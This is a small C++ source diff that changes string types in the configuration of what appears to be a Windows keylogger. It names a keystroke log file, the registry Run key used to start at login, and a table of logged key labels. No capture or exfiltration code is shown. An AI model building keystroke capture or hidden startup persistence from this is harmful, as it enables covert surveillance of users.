@@ -6,9 +6,9 @@
 
 namespace configuration
 {
-    constexpr const wchar_t* out_file = L"logged.txt";
+    constexpr const WCHAR* out_file = L"logged.txt";
 
-    constexpr const wchar_t* lp_sub_key = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+    constexpr const WCHAR* lp_sub_key = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
 
     constexpr uint16_t keyboard_state_size = 256;
 
@@ -16,7 +16,7 @@ namespace configuration
 
     constexpr uint8_t virtual_key_v = 0x56;
 
-    const std::unordered_map<DWORD, const wchar_t*> key_codes
+    const std::unordered_map<DWORD, const WCHAR*> key_codes
     {
         { VK_RETURN, L"\n" },
         { VK_ESCAPE, L"[ESCAPE]" },
